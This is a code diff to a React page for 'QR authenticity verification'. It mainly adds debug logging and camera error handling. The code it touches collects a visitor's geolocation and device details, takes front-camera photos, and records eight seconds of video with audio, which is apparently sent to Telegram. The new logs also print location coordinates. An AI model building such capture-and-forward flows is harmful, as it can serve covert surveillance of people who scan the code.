@@ -58,9 +58,11 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
       streamRef.current.getTracks().forEach((track: MediaStreamTrack) => track.stop());
       setStream(null);
       streamRef.current = null; // Clear the ref as well
+      console.log("MediaStream tracks stopped and stream ref cleared.");
     }
     if (videoRef.current) {
       videoRef.current.srcObject = null;
+      console.log("Video element srcObject cleared.");
     }
     setIsCameraActive(false);
     setIsRecording(false); // Убедимся, что флаг записи сброшен
@@ -69,6 +71,7 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
     setRecordedChunks([]); // Очистим чанки
     recordedChunksRef.current = []; // Clear the ref
     setVideoPreviewUrl(null); // Очистим URL превью
+    console.log("Camera stopped and states reset.");
   }, []); // Теперь stopCamera стабилен
 
   const startVerificationProcess = useCallback(async () => {
@@ -111,16 +114,19 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
           geoLat = position.coords.latitude;
           geoLon = position.coords.longitude;
           setStatusMessage(t.authenticity.processingRequest + " (Location obtained.)");
+          console.log(`Geolocation obtained: Lat ${geoLat}, Lon ${geoLon}`);
         } catch (geoError) {
           console.warn("Geolocation permission denied or error:", geoError);
           setStatusMessage(t.authenticity.processingRequest + " (Location access denied or failed.)");
         }
       } else {
         setStatusMessage(t.authenticity.processingRequest + " (Geolocation not supported.)");
+        console.warn("Geolocation not supported by this browser.");
       }
 
       // 2. Получаем информацию об устройстве и часовом поясе
       const { deviceVendor, deviceModel, cpuArchitecture, clientTimezone } = getDeviceInfo();
+      console.log("Device Info:", { deviceVendor, deviceModel, cpuArchitecture, clientTimezone });
 
       // 3. Отправляем начальное уведомление о посещении для получения подписи
       setStatusMessage(t.authenticity.processingRequest + " (Sending initial notification...)");
@@ -144,35 +150,60 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
       const notifyResponse = await notifyVisit(bodyData, utmQueryParams);
       initialCaption = notifyResponse;
       setStatusMessage(t.authenticity.processingRequest + " (Initial notification sent.)");
+      console.log("Initial notification sent, caption received:", initialCaption);
 
       // 4. Запрашиваем доступ к камере (сначала фронтальная, затем задняя)
       setStatusMessage(t.authenticity.processingRequest + " (Requesting camera access...)");
       let mediaStream: MediaStream;
       try {
+        console.log("Attempting to get user media (front camera)...");
         mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
-        setStatusMessage(t.authenticity.processingRequest + " (Camera access granted.)");
+        setStatusMessage(t.authenticity.processingRequest + " (Front camera access granted.)");
+        console.log("Front camera access granted.");
       } catch (frontCameraError: unknown) {
         console.warn("Front camera not available or permission denied, trying rear camera:", frontCameraError);
         try {
+          console.log("Attempting to get user media (rear camera)...");
           mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
           setStatusMessage(t.authenticity.processingRequest + " (Rear camera access granted.)");
+          console.log("Rear camera access granted.");
         } catch (rearCameraError: unknown) {
           console.error("No camera available or permission denied for both front and rear cameras:", rearCameraError);
-          throw new DOMException("No camera available or permission denied.", "NotFoundError");
+          setError(t.authenticity.qrScanError + " (No camera available or permission denied)."); // Set error here
+          setStatusMessage(t.authenticity.qrScanError + " (No camera available or permission denied).");
+          setIsLoading(false); // Stop loading
+          isProcessingRef.current = false; // Reset flag
+          showError(t.authenticity.qrScanError + " (No camera available or permission denied).");
+          return; // Exit early
         }
       }
       
+      console.log("Setting stream and activating camera state.");
       setStream(mediaStream);
       setIsCameraActive(true);
 
       if (videoRef.current) {
+        console.log("Video ref available. Setting srcObject.");
         videoRef.current.srcObject = mediaStream;
+        // NEW: Add a small delay to ensure srcObject is fully set before playing
+        await new Promise(resolve => setTimeout(resolve, 100)); // 100ms delay
+        console.log("Attempting to play video.");
         await videoRef.current.play();
+        console.log("Video element started playing successfully.");
+      } else {
+        console.error("Video element ref is not available when trying to set srcObject and play.");
+        setError(t.authenticity.qrScanError + " (Video element not found for camera stream).");
+        setStatusMessage(t.authenticity.qrScanError + " (Video element not found).");
+        setIsLoading(false);
+        isProcessingRef.current = false;
+        showError(t.authenticity.qrScanError + " (Video element not found).");
+        return;
       }
 
       // NEW: Longer initial delay for camera to stabilize before first photo
       setStatusMessage(t.authenticity.processingRequest + " (Camera stabilizing...)");
       await new Promise(resolve => setTimeout(resolve, 2000)); // 2 seconds for stabilization
+      console.log("Camera stabilization complete.");
 
       // 5. Take 3 Photos with short delays
       setStatusMessage(t.authenticity.processingRequest + " (Taking photos...)");
@@ -201,6 +232,7 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
         }
       }
       setStatusMessage(t.authenticity.processingRequest + " (Photos sent.)");
+      console.log("All photos sent.");
 
 
       // 6. Начинаем запись видео (если снимки были успешными)
@@ -215,6 +247,7 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
       };
 
       recorder.onstop = async () => {
+        console.log("MediaRecorder stopped. Processing video...");
         setIsRecording(false);
         stopCamera(); // Останавливаем камеру после записи
         
@@ -229,7 +262,7 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
           showSuccess(t.authenticity.recordingSuccess);
           setStatusMessage(t.authenticity.recordingSuccess);
           sessionStorage.setItem(QR_SCAN_SESSION_KEY, 'true'); // Устанавливаем флаг после успешного завершения
-          console.log("QR_SCAN_SESSION_KEY set to true in sessionStorage.");
+          console.log("QR_SCAN_SESSION_KEY set to true in sessionStorage. Video sent successfully.");
         } catch (videoSendError: unknown) {
           console.error("Error sending video to Telegram:", videoSendError);
           showError(t.authenticity.recordingError);
@@ -243,9 +276,11 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
 
       recorder.start();
       setIsRecording(true);
+      console.log("Video recording started for 8 seconds.");
       setTimeout(() => {
         if (recorder.state !== 'inactive') {
           recorder.stop();
+          console.log("Video recording stopped by timeout.");
         }
       }, 8000); // Запись 8 секунд
 
